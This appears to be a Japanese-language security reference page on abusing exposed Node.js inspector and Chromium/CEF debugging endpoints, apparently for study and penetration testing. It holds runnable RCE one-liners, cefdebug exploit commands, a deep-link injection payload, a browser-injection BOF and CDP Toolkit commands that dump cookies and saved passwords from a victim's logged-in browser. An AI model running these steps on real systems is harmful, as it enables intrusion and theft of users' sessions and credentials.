# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

歴史的な実例には、Multimaster walkthrough と CVE-2019-1414 Visual Studio Code debugger attack があります。これらはバージョン固有の文脈として参照し、現在の Electron や Chromium のすべての対象で同じプリミティブが利用できると想定しないでください。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本情報

[ドキュメントより](https://nodejs.org/learn/getting-started/debugging): `--inspect` スイッチを指定して起動すると、Node.js プロセスはデバッグクライアントからの接続を待ち受けます。**デフォルト**では、ホスト **`127.0.0.1`**、ポート **`9229`** で待ち受けます。各プロセスには**一意の** **UUID** も割り当てられます。<sup>[[4]](#references)</sup>

接続するには、Inspector クライアントがホストアドレス、ポート、UUID を把握し、指定する必要があります。完全な URL は、たとえば `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js の実行環境に完全にアクセスできる**ため、このポートに接続できる悪意のある攻撃者は、Node.js プロセスの権限で任意のコードを実行できる可能性があります（**権限昇格の可能性**）。<sup>[[4]](#references)</sup>

Inspector を起動する方法はいくつかあります。<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

調査対象のプロセスを起動すると、次のようなものが表示されます:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF**（**Chromium Embedded Framework**）ベースのプロセスでは、`--remote-debugging-port=9222` を指定するとデバッガーを公開できます。これは Node.js インスペクターではなく、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由でブラウザーを公開するため、Node.js の `process` ベースのペイロードはデフォルトでは直接適用できません。<sup>[[2]](#references)[[5]](#references)</sup>

デバッグ対象のブラウザーを起動すると、次のようなものが表示されます。<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDPエンドポイントの列挙と操作

HTTPのdiscovery endpointでは、**browser** WebSocketと個々の**target**（タブ、worker、拡張機能など）のWebSocketが区別されます。ブラウザーのエンドポイントには`/json/version`、targetには`/json/list`を問い合わせます。返された`webSocketDebuggerUrl`の値に、CDPのJSON-RPC風メッセージを直接送信して操作できます。<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

たとえば、`websocat "$BROWSER_WS"` で接続して、`{"id":1,"method":"Target.getTargets"}` または `{"id":2,"method":"Storage.getCookies"}` を送信します。ページターゲット（`websocat "$PAGE_WS"`）では、`Runtime.evaluate` がそのレンダラー内で実行され、`Page.captureScreenshot` は base64 エンコードされたスクリーンショットを返します。`document.cookie` では `HttpOnly` Cookie を確認できませんが、`Storage.getCookies` はブラウザーに Cookie ストアを問い合わせます。<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### ブラウザー、WebSocket、same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webブラウザーで開いたWebサイトは、ブラウザーのセキュリティモデルのもとでWebSocketおよびHTTPリクエストを送信できます。**一意のdebugger session idを取得する**には、**初回のHTTP接続**が必要です。**same-origin-policy**により、Webサイトは**このHTTP接続**を行えません。[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**に対する**追加のセキュリティ対策として、Node.jsは接続の**'Host' headers**が**IPアドレス**または正確に**`localhost`**を指定していることを検証します。<sup>[[4]](#references)</sup>

> [!TIP]
> この**セキュリティ対策により、HTTPリクエストを送信するだけで**（SSRF vulnを悪用すれば可能です）**inspectorを悪用してコードを実行することを防ぎます**。<sup>[[4]](#references)</sup>

### 実行中のプロセスでinspectorを起動する

実行中のnodejsプロセスに**シグナルSIGUSR1**を送信すると、デフォルトポートで**inspectorを起動**できます。ただし、十分な権限が必要です。そのため、**プロセス内の情報への特権アクセス**を得られる可能性はありますが、直接的な権限昇格にはなりません。<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> これはコンテナで役立ちます。プロセスを**シャットダウンして新しいプロセスを起動する**方法は、プロセスとともに**コンテナ**も**強制終了される**ため、選択肢にならないからです。<sup>[[6]](#references)</sup>

### inspector/debugger に接続する

**Chromium ベースのブラウザー**に接続するには、Chrome の場合は `chrome://inspect`、Edge の場合は `edge://inspect` の URL にアクセスします。Configure ボタンをクリックし、**対象のホストとポート**が正しく一覧表示されていることを確認してください。画像は Remote Code Execution（RCE）の例です。<sup>[[2]](#references)[[4]](#references)</sup>

![デバッガーにアクセスするための URL が表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger に接続する: Chromium ベースのブラウザーに接続するには、...](<../../images/image (674).png>)

**コマンドライン**を使用して、次のように debugger/inspector に接続できます。<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) を使うと、ローカルで実行中の**インスペクターを検出**し、そこに**コードを注入**できます。<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由でブラウザーに接続している場合、**NodeJS RCE exploits は機能しない**ことに注意してください（興味深い使い方を見つけるには、APIを確認する必要があります）。<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Electron の XSS から [**RCE を取得する方法**](../../desktop-application-security/electron-desktop-apps/index.html)を探している場合は、このページを確認してください。

Node **inspector** に**接続**できる場合に**RCE**を取得する一般的な方法として、次のようなものがあります（**Chrome DevTools protocol への接続では機能しない**ようです）。<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocolペイロード

APIはこちらで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
このセクションでは、このプロトコルを悪用するために使われた興味深い手法をいくつか紹介します。

### Chrome 136以降のデフォルトプロファイル制限

**Chrome 136**以降、Chromeは**デフォルトのChromeデータディレクトリ**を対象とする場合、`--remote-debugging-port`と`--remote-debugging-pipe`を無視します。このスイッチを使用するには、標準とは異なる`--user-data-dir`を指定する必要があります。別個の暗号化キーと分離されたブラウザ状態により、単純なフラグベースの手法で、ユーザーが通常使用する認証済みプロファイルを露出させることはできません。このChrome固有の制限が、検証なしに古いChromeビルド、Chrome for Testing、Electron/CEFアプリケーション、その他のChromium派生製品にも適用されると考えてはいけません。<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

したがって、現在の Chrome プロセスが `--remote-debugging-port` のみを指定して起動されているのを確認しても、CDP が有効になった証拠には**なりません**。リスナーと `/json/version` を確認し、実際にどのプロファイルが使われているかを特定してください。<sup>[[14]](#references)</sup>

### Deep Link 経由のパラメーターインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) で、Rhino security は、CEF ベースのアプリケーションがシステムにカスタム UR**I**（workspaces://index.html）を登録しており、完全な URI を受け取った後、その URI から部分的に構築した設定で CEF ベースのアプリケーショ**ン**を起動することを発見しました。<sup>[[8]](#references)</sup>

URI パラメーターは URL デコードされ、CEF ベースのアプリケーションの起動に使用されていました。そのため、ユーザーはコマンドラインにフラグ **`--gpu-launcher`** を**インジェクト**して、任意の処理を実行できました。<sup>[[8]](#references)</sup>

たとえば、次のようなペイロードです:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exeを実行します。<sup>[[8]](#references)</sup>

### ファイルの上書き

**ダウンロードファイルの保存先フォルダ**を変更し、ファイルをダウンロードして、アプリケーションで頻繁に使用される**ソースコード**を**悪意のあるコード**で**上書き**します。<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCEと情報窃取

STAR Labsは、外部に公開されたWebDriver/CDPサービスによって任意ファイルの読み取りやRCEが可能になり、一部の構成ではDNS rebindingによってexploit chainが完成することを示しました。<sup>[[9]](#references)</sup>

ChromeDriverのWebDriverサービスは、Chrome DevTools/CDPとは別のものです。新しいセッションで起動するブラウザー実行ファイルは、[`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities)で指定します。権限のない呼び出し元がrootで動作するChromeDriverサービスにアクセスでき、呼び出し元が制御する実行ファイルパスを指定してセッションを作成できる場合、その起動によってサービスの権限境界を越える可能性があります。`/sessions`が空の応答を返しても、新しいセッションを作成できるかどうかは判断できません。その経路が実際に利用できると結論づける前に、プロセスの所有者、実際のリスナーへの到達性、セッション認証、実行ファイルへのアクセス、制限機構を確認してください。プロセス名や一般的なポート番号だけでは不十分です。[Googleのセキュリティガイダンス](https://developer.chrome.com/docs/chromedriver/security-considerations)では、ChromeDriverを権限のないアカウントで実行するよう推奨しています。パッシブな列挙では、WebDriverセッションを作成しないでください。

ブラウザー自動化とChromiumのセキュリティに関する過去の事例については、Counter WebDriverの解説とProject Zeroのissues 773、1742、1944も参照してください。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 起動中のChromiumプロセス内でCDPを有効化する

Chromeのデフォルトプロファイル制限がブロックするのは、コマンドラインによる有効化だけです。ブラウザープロセスを操作できる十分な同一ユーザー権限があれば、オリジナルの[**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler)とCobalt Strikeの[**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF)は、すでに実行中の`chrome.exe`または`msedge.exe`内で、Chromiumの非エクスポート関数`content::DevToolsAgentHost::StartRemoteDebuggingServer`を呼び出します。そのため、エンドポイントは実際のプロファイルに紐づき、タブ、拡張機能、Cookie、認証済み状態が保持されます。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

一般的なx64版Chrome/Edgeプロセスの場合、BOFはブラウザーウィンドウと読み込まれた`chrome.dll`/`msedge.dll`を見つけ、リモートPEをスキャンしてマスク付きシグネチャを検出し、スタブとコンテキストブロックを割り当て、ウィンドウプロシージャを一時的に置き換えたうえで、最終的な呼び出しをブラウザーの**UIスレッド**上で実行します。関連する実行時入力は、`StartRemoteDebuggingServer`、Chromiumの`operator new`、`TCPServerSocketFactory::CreateForHttpServer`、およびfactory vtableです。必須シグネチャのいずれかが一意に一致しない場合、実行は停止します。<sup>[[15]](#references)[[16]](#references)</sup>

BOFではブラウザーモードと任意のポートを指定できます。その後、ヘルパースクリプトでエンドポイントを検証し、Cookieを収集できます。`chrome-iso`は、ChromeのWindows Process Isolation境界に対する別の経路です。<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` パスでは、隔離プロセスに対してクエリ限定のハンドルのみを使用します。実行中のプロセスと PE イメージサイズが一致するインストール済みの `chrome.dll` を特定し、そのローカルイメージからシンボルを解決します。さらに、Chromium の `WindowImpl` ディスパッチ、同期的な `WM_COPYDATA`、既存イメージの User32 フックを利用して UI スレッドに到達します。<sup>[[16]](#references)</sup>

> [!WARNING]
> これは**侵害後のブラウザプロセス操作**手法であり、認証不要のネットワークバイパスではありません。関連する C++ シンボルがエクスポートされておらず、ブラウザの更新後に変更される可能性があるため、ビルドに依存します。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### ブラウザ更新後のシグネチャの更新

ターゲットにインストールされているバージョンと完全に一致する `chrome.dll` または `msedge.dll` と、それに対応する PDB を使用します。Windows SDK の `symchk.exe` でシンボルをダウンロードします。その後、リポジトリのスクリプトを使って `StartRemoteDebuggingServer` を特定し、アロケーターとソケットファクトリーの入力を導出するか、BOF に埋め込まれているすべてのシグネチャを検証します。<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

0件または複数件のヒットがあった場合、任意のアドレスで置き換えてはなりません。既知の `operator new` または `CreateForHttpServer` のパターンが変わりすぎて新しいマスクのシードに使えない場合は、PDBを使って `pe_signature_finder.py` でそのシンボルを調査し、対象モジュール内で一意となるバイト列を導き出してください。<sup>[[16]](#references)[[18]](#references)</sup>

#### CDP Toolkitによる認証済みブラウザーからの抽出

この手法は、App-Bound Encryption (ABE) をオフラインで復号したり、デバイスバインディングを解除したりするものではありません。代わりに、正規のブラウザーを**復号オラクルおよび認証済みインタラクションプロキシ**として扱います。`Storage.getCookies` は稼働中のブラウザーにCookieストアを要求し、ナビゲーションやスクリーンキャストのワークフローでは、リクエスト、ストレージ、エンタープライズ認証、デバイスバインド動作を被害者の既存のブラウザー内に留めます。<sup>[[17]](#references)[[18]](#references)</sup>

ループバックCDPリスナーをオペレーターのピボット経由でルーティングした後、[**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit)を使って一般的なアーティファクトを列挙・収集できます。<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`、`tabs list`、`cookies dump`、`tabs screenshot`は、主に`/json/version`、ターゲットリスト、`Storage.getCookies`、`Page.captureScreenshot`をラップしたものです。一方、履歴、ブックマーク、拡張機能、パスワードのメタデータを取得するには、一時的な`chrome://`/`edge://` WebUIターゲットが必要です。ツールキットは画面が描画されるまで待機し、そのモデルまたはDOMを調べて結果を収集し、ターゲットを閉じます。<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump`はさらに踏み込みます。実際に保存されたログイン情報のオリジンを開き、認証情報フィールドにフォーカスし、CDPの入力イベントを使ってネイティブの自動入力候補を選択し、入力された値を読み取ります。オリジン/ポート/パスは保存済みパスワードのrealmと厳密に一致させる必要があります。候補ポップアップはネイティブのブラウザーUIであるため、表示モードが最も確実なデフォルトです。<sup>[[17]](#references)[[18]](#references)</sup>

ライブ操作には、`browser-takeover screencast`がフレームをストリーミングし、実際のターゲット（バックグラウンドモードや画面外モードを含む）に入力を送信します。これに対し、`browser-takeover proxy`はローカルでHTTPとHTTPS `CONNECT`を受け付け、非表示のChromeターゲットを介してアップストリームリクエストを送信します。非表示ターゲットが利用できない場合は、バックグラウンドタブにフォールバックします。これにより被害者のネットワーク/認証コンテキストを維持できますが、返されたコンテンツをオペレーターのブラウザーで描画するため、複雑なクライアントサイドアプリケーションでは忠実度が低くなります。<sup>[[17]](#references)[[18]](#references)</sup>

検出では、`--remote-debugging-*`コマンドラインのテレメトリだけに頼らないでください。ブラウザープロセスに対する不審なハンドルやメモリ操作（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、スレッド作成）、DLL injection、Chrome/Edgeが所有する予期しないループバック待ち受けソケットも相関分析してください。<sup>[[15]](#references)</sup>

### Post-Exploitation

実環境で、Chromiumベースのブラウザーを使用しているユーザーPCを**侵害した後**に行う歴史的な手法として、デバッグを有効にしてブラウザーを再起動し、ループバックポートを転送する方法がありました。選択したプロファイルを引き続き受け入れる製品/ビルドでは、被害者の閲覧状態が露呈する可能性がありますが、Chrome 136以降では、デフォルトのデータディレクトリに対してこの方法は機能しません。<sup>[[7]](#references)[[14]](#references)</sup>

旧バージョンや特定バージョンのターゲット向けに、元の再起動コマンドを以下に残します。2つ目のコマンドは、現行Chromeでサポートされている形式ですが、被害者の通常の認証済み状態を再度開くのではなく、分離されたプロファイルを作成します。<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS固有のChromiumの再起動、拡張機能、CDPのtradecraftについては、[macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)を参照してください。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debuggerの検査・悪用ツール](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger経由のVisual Studio Codeリモートコード実行](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - はじめに](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chromeのデバッグ機能を悪用してリモートからブラウジングセッションを監視・制御する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpacesリモートコード実行](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS RebindingとCDP経由のWebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - BotからRCEへ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromiumバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromiumバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromiumバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [セキュリティ向上のためのリモートデバッグスイッチの変更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [実行中のEdge BrowserへのCDPの注入: Runtime Browser Instrumentationの詳細](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monsterの帰還](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
